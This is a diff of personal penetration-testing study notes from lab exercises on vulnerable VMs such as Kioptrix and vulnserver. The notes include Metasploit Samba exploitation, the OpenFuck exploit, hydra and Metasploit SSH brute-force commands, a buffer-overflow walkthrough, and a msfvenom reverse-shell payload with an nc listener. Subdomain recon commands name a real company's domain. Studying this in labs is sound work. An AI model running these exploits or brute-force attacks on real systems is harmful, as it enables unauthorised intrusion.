@@ -9,19 +9,19 @@ Discovering email addresses:
 	hashes.org
 
 Hunting Subdomains
+	$ sublist3r -d tesla.com (sudo apt install sublist3r)
 	crt.sh
 	owasp amass
-	$ sublist3r -d tesla.com
-	tomnomnom httprobe
+	tomnomnom httprobe (give it a list to probe)
 
 Identifing web technologies
-	builtwith
+	builtwith.com
 	wappalyzer firefox
 	$ whatweb https://tesla.com 
 	
-Burp Suite on kali
-
-LinkedIn, Twitter...
+	Burp Suite on kali
+	Google FU (https://ahrefs.com/blog/google-advanced-search-operators/)
+	LinkedIn, Twitter...
 	
 2. Scanning
 	vulnhub.com - vulnerable VMs
@@ -29,14 +29,18 @@ LinkedIn, Twitter...
 	kioptrix ip: 192.168.0.33
 
 	$ sudo arp-scan -l 
+	
+	$ netdiscover -r 192.168.253.0/24
+	
+	stealth connections "SYN SYNACK ACK", "SYN SYNACK RST"
 
-	TCP scan: $ nmap -T4 -p- -A 192.168.0.33(T4: speed of 4, -p-: all ports, -A: tell me everything)
+
+	TCP scan: $ nmap -T4 -p- -A 192.168.0.33  (T4: speed of 4, -p-: all ports, -A: tell me everything)
 	UDP scan: $ nmap -T4 -p- -sU 192.168.0.33 (T4: speed of 4, -p-: all ports, scan UDP)
 
 
 3. Enumerating HTTP/S 
 	nmap -T4 -p- -A 192.168.0.33 resulted in opened ports= 80, 443, 22, 139...
-
 
 	$ nikto -h http://192.168.0.33
 
@@ -47,7 +51,7 @@ LinkedIn, Twitter...
 	$ msf6 > search smb =>  105  auxiliary/scanner/smb/smb_version
 	$ msf6 > use 105
 	$ info options 
-	$ msf6 auxiliary(scanner/smb/smb_version) > set RHOST 192.168.98.87
+	$ msf6 auxiliary(scanner/smb/smb_version) > set RHOST 192.168.98.87 (RHOST -> target)
 	$ run 
 
 
@@ -56,3 +60,117 @@ LinkedIn, Twitter...
 
 5. Enumerating SSH
 	$ ssh 192.168.98.87 -o KexAlgorithms=+diffie-hellman-group1-sha1 -c aes128-cbc ?!? Not working
+	
+	
+&. Reasearch...
+	Google -> exploit-db, github, rabit7...
+	Terminal -> searchsploite
+	$ searchsploite Samba 2.2
+	$ searchsploite mod ssl 2
+	
+7. Nessus scans
+	
+8. Reverse shell vs Bind shell
+	Reverse -> victom connects to me
+	Bind -> we connect to victom 
+	
+9. Staged vs Non-Staged payloads
+	Non-Staged -> sends exploit shellcode all at once (won't always work) example: windows/meterpreter_reverse_tcp
+	Staged -> sends payload in stages (less stable) example: windows/meterpreter/reverse_tcp
+	If one payload doesn't work -> try other one && switch shells as well
+	
+10. Geining root using Metasploit
+	we will use trans2open
+	$ msfconsole
+	$ search trans2open
+	$ use 1 (linux)
+	$ msf6 exploit(linux/samba/trans2open) > options -> we have to set RHOST (target)
+	$ set rhosts 192.168.0.35
+	$ options -> one more time
+	$ show targets
+	$ run or exploit -> "Sending stage" is good -> but not when Session is dead -> change payload
+	$ options
+	$ set payload linux/x86/shell_reverse_tcp -> non staged payload
+	$ options to check
+	$ run or exploit -> worked... whoami -> root; hostname -> kioptrix.level1
+	
+11. Menual Exploitation 
+	use this: https://github.com/hel2tonWernik/OpenLuck
+	./OpenFuck 0x6b 192.168.0.35 -c 40 -> gives shell
+	
+	
+12. Brute Force Attacks
+	Attacking SSH
+		Using hydra
+			$ hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.0.35:22 -t 4 -V -> Doesn't work...
+		Using msfconsole
+			$ msfconsole
+			$ use auxiliary/scanner/ssh/ssh_login
+			$ options
+			$ set rhosts 192.168.0.35
+			$ set threads 5
+			$ set username root
+			$ set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
+			$ set verbose true
+			$ run
+
+13. Credential Stuffing & Password Spraying
+	Burp Suite stuff... Doesnot work for me :(
+	
+
+14. Buffer Overload
+	15. Spiking
+		Disable real time protection on windows
+		run vulnserver and immunity debugger (ID) as admin
+		attach volnserver in ID
+		
+		On kali:
+			$ nc -nv 192.168.253.136 9999
+			$ generic_send_tcp 192.168.253.136 9999 stats.spk 0 0
+			$ generic_send_tcp 192.168.253.136 9999 trun.spk 0 0
+				So TRUN is vulnerable... Overloaded ESP, ESI and EIP (the important one)
+	16. Fuzzing
+		Disable real time protection on windows
+		run vulnserver and immunity debugger (ID) as admin
+		attach volnserver in ID
+		
+		On kali:
+			./fuzzing.py
+		
+	17. Find Offset
+		$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000 -> generates some junk buffer that has to be copied for find_offset.py -> check EIP on ID (386F4337)
+		$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337 -> got 2003
+	
+	18. Overwrite EIP
+		$ ./overwrite_EIP.py -> controlling EIP = 42424242 => B*4 (we controll EIP now)
+	
+	19. Finding bad characters
+		$ ./find_bad_chars.py
+	
+	20. Finding the right modules
+		using mona modules
+		On ID:
+			!mona modules
+		On kali:
+			$ /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb 
+			nasm > JMP ESP -> returns: 00000000  FFE4              jmp esp
+		On ID:
+			!mona find "\xff\xe4" -m essfunc.dll -> looking for return addresses -> 625011af
+			$ ./find_right_module
+		... some shit in ID
+
+	21. Gen shellcode and gain root
+		$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.253.228 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00" -> Generets shellcode
+		$ nc -nvlp 4444 
+		On win10 run vulnserver as admin
+		$ ./generate_shellcode.py -> grants reverse shell on windows VM!
+	
+	
+
+
+
+
+
+
+
+
